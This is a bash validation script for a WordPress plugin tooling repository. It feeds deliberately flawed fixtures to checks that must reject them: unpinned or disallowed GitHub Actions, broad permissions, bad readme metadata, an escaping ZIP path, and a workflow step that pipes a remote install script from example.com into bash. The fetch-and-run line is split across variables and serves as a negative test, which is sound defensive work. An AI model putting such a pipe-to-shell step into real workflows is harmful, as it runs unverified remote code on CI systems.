#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
# shellcheck source=../lib/require_tools.sh
. "$SCRIPT_DIR/../lib/require_tools.sh"

wp_plugin_base_require_commands "foundation validation" git php node ruby perl rg rsync zip unzip jq docker
audit_fixture=""
zip_fixture=""
quality_fixture=""
metadata_fixture=""
deploy_fixture=""

while IFS= read -r file; do
  bash -n "$file"
done < <(find "$ROOT_DIR/scripts" -name '*.sh' -print | sort)

bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$ROOT_DIR"
bash "$ROOT_DIR/scripts/foundation/check_version.sh"
bash "$ROOT_DIR/scripts/foundation/check_release_branch.sh" "release/$(tr -d '\n' < "$ROOT_DIR/VERSION")"

for fixture_name in standard-plugin nonstandard-plugin; do
  source_fixture="$ROOT_DIR/tests/fixtures/$fixture_name"
  fixture="$(mktemp -d)"
  branch_name="release/1.2.3"

  if [ "$fixture_name" = "nonstandard-plugin" ]; then
    branch_name="release/2.4.6"
  fi

  mkdir -p "$fixture/.wp-plugin-base"
  cp -R "$source_fixture/." "$fixture/"
  rsync -a --exclude '.git' "$ROOT_DIR/" "$fixture/.wp-plugin-base/"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "$branch_name"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/release/generate_github_release_body.sh" "${branch_name#release/}" > "$fixture/dist/release-body.md"
  rm -rf "$fixture/dist"
  rm -rf "$fixture"
done

quality_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/quality-ready/." "$quality_fixture/"
mkdir -p "$quality_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$quality_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$quality_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
WP_PLUGIN_BASE_ROOT="$quality_fixture" bash "$ROOT_DIR/scripts/ci/validate_wordpress_readiness.sh" "" "release/1.3.0"

metadata_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/quality-ready/." "$metadata_fixture/"
mkdir -p "$metadata_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$metadata_fixture/.wp-plugin-base/"
perl -0pi -e 's/^Tested up to: .*$//m' "$metadata_fixture/readme.txt"
WP_PLUGIN_BASE_ROOT="$metadata_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if WP_PLUGIN_BASE_ROOT="$metadata_fixture" bash "$ROOT_DIR/scripts/ci/validate_wordpress_readiness.sh" "" "release/1.3.0" >/dev/null 2>&1; then
  echo "Readiness unexpectedly passed with invalid readme metadata." >&2
  exit 1
fi

deploy_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/quality-ready/." "$deploy_fixture/"
mkdir -p "$deploy_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$deploy_fixture/.wp-plugin-base/"
mkdir -p "$deploy_fixture/docs"
mv "$deploy_fixture/readme.txt" "$deploy_fixture/docs/readme.txt"
perl -0pi -e 's/^README_FILE=.*/README_FILE=docs\/readme.txt/m' "$deploy_fixture/.wp-plugin-base.env"
WP_PLUGIN_BASE_ROOT="$deploy_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
WP_ORG_DEPLOY_ENABLED=true
export WP_ORG_DEPLOY_ENABLED
if WP_PLUGIN_BASE_ROOT="$deploy_fixture" bash "$ROOT_DIR/scripts/ci/validate_wordpress_readiness.sh" "" "release/1.3.0" >/dev/null 2>&1; then
  echo "Readiness unexpectedly passed with an invalid WordPress.org deploy layout." >&2
  exit 1
fi
unset WP_ORG_DEPLOY_ENABLED

managed_child="$(mktemp -d)"
trap 'rm -rf "$managed_child" "$audit_fixture" "$zip_fixture" "$quality_fixture" "$metadata_fixture" "$deploy_fixture"' EXIT
mkdir -p "$managed_child/.wp-plugin-base"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$managed_child/"
rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_child/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$managed_child" bash "$managed_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
test -f "$managed_child/.github/workflows/ci.yml"
test -f "$managed_child/CONTRIBUTING.md"
test ! -f "$managed_child/.github/CODEOWNERS"

audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an unpinned action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a disallowed action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

remote_script_scheme='https'
remote_script_separator='://'
remote_script_target='example.com/install.sh'
remote_script_prefix="      - run: curl -fsSL ${remote_script_scheme}${remote_script_separator}${remote_script_target} | "
remote_script_shell='bash'
cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${remote_script_prefix}${remote_script_shell}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a remote script pipe-to-shell payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for broad permissions." >&2
  exit 1
fi

zip_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_fixture/"
mkdir -p "$zip_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$zip_fixture/.wp-plugin-base/"
perl -0pi -e 's/^ZIP_FILE=.*/ZIP_FILE=..\/outside.zip/m' "$zip_fixture/.wp-plugin-base.env"

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted an escaping ZIP_FILE." >&2
  exit 1
fi

rm -rf "$zip_fixture"

echo "Validated foundation repository at $ROOT_DIR"
